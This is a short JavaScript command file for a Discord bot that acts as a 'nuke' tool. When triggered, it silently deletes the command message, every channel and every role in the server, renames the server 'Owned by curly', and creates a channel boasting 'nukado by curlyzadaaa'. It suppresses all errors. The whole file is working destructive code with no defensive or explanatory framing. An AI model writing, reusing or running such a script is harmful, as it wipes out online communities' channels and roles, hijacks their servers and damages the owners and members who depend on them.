exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    await msg.guild.setName('Owned by curly')

    msg.guild.createChannel('nukado by curlyzadaaa', {
        type: 'text'
    }).catch(() => {})
    

}